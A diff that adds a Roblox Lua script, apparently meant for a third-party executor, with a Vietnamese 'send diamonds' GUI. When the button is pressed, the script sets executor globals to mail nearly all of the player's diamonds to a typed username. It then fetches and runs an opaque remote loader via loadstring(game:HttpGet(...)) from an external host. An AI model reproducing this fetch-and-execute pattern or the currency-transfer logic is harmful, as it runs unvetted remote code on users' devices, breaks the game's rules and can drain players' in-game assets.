@@ -1,0 +1,108 @@
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DiamondSenderGUI"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global -- Luôn nằm trên cùng
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Khung chính
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 180)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -90)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Visible = false -- Ban đầu ẩn
+Frame.ZIndex = 1000
+Frame.Parent = ScreenGui
+
+-- Tiêu đề
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Text = "Gửi Kim Cương"
+TitleLabel.Size = UDim2.new(1, 0, 0, 30)
+TitleLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+TitleLabel.Font = Enum.Font.SourceSansBold
+TitleLabel.TextSize = 22
+TitleLabel.ZIndex = 1001
+TitleLabel.Parent = Frame
+
+-- Ô nhập tên người dùng
+local UsernameBox = Instance.new("TextBox")
+UsernameBox.PlaceholderText = "Nhập tên người dùng..."
+UsernameBox.Size = UDim2.new(1, -20, 0, 40)
+UsernameBox.Position = UDim2.new(0, 10, 0, 50)
+UsernameBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UsernameBox.TextColor3 = Color3.new(0, 0, 0)
+UsernameBox.Text = ""
+UsernameBox.Font = Enum.Font.SourceSans
+UsernameBox.TextSize = 20
+UsernameBox.ClearTextOnFocus = false
+UsernameBox.ZIndex = 1001
+UsernameBox.Parent = Frame
+
+-- Nút GỬI
+local SendButton = Instance.new("TextButton")
+SendButton.Text = "GỬI"
+SendButton.Size = UDim2.new(1, -20, 0, 40)
+SendButton.Position = UDim2.new(0, 10, 0, 110)
+SendButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+SendButton.TextColor3 = Color3.new(1, 1, 1)
+SendButton.Font = Enum.Font.SourceSansBold
+SendButton.TextSize = 20
+SendButton.ZIndex = 1001
+SendButton.Parent = Frame
+
+-- Nút Ẩn/Hiện GUI
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Text = "❌" -- Vì ban đầu đang ẩn
+ToggleButton.Size = UDim2.new(0, 40, 0, 40)
+ToggleButton.Position = UDim2.new(0, 10, 0, 10)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+ToggleButton.Font = Enum.Font.SourceSansBold
+ToggleButton.TextSize = 22
+ToggleButton.ZIndex = 1002
+ToggleButton.Parent = ScreenGui
+
+-- Xử lý Ẩn/Hiện
+local isVisible = false
+ToggleButton.MouseButton1Click:Connect(function()
+    isVisible = not isVisible
+    Frame.Visible = isVisible
+    ToggleButton.Text = isVisible and "👁" or "❌"
+end)
+
+-- Xử lý GỬI
+SendButton.MouseButton1Click:Connect(function()
+    local user = UsernameBox.Text
+    if user == "" then
+        warn("Bạn chưa nhập tên người dùng.")
+        return
+    end
+
+    local diamondsStat = game.Players.LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("💎 Diamonds")
+    if not diamondsStat then
+        warn("Không tìm thấy chỉ số Diamonds.")
+        return
+    end
+
+    local currentDiamondValue = diamondsStat.Value
+    if currentDiamondValue < 1000000 then
+        warn("Số lượng kim cương không đủ.")
+        return
+    end
+
+    local adjustedDiamondValue = currentDiamondValue - 200000
+
+    getgenv().Settings = {
+        Mailing = {
+            ["Diamonds"] = {Class = "Currency", Amount = adjustedDiamondValue},
+        },
+        Users = {
+            user,
+        },
+        ["Split Items Evenly"] = false,
+        ["Only Online Accounts"] = false,
+    }
+
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
+end)
